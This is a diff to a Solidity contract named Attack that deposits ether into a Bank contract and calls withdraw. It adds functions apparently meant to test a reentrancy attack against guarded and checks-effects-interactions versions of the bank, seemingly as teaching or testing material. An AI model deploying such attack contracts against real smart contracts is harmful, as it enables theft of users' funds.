@@ -5,6 +5,7 @@ import "./Bank.sol";
 
 contract Attack {
     Bank public targetContract;
+
     constructor(address _targetContract) {
         targetContract = Bank(_targetContract);
     }
@@ -18,7 +19,17 @@ contract Attack {
 
     // Starts the attack
     function attack() public payable {
-        targetContract.addBalance{value : msg.value}();
+        targetContract.addBalance{value: msg.value}();
+        targetContract.withdraw();
+    }
+
+    function attackReentrancyGuard() public payable {
+        targetContract.addBalance{value: msg.value}();
+        targetContract.withdraw();
+    }
+
+    function attackCheckEffectInteraction() public payable {
+        targetContract.addBalance{value: msg.value}();
         targetContract.withdraw();
     }
 }
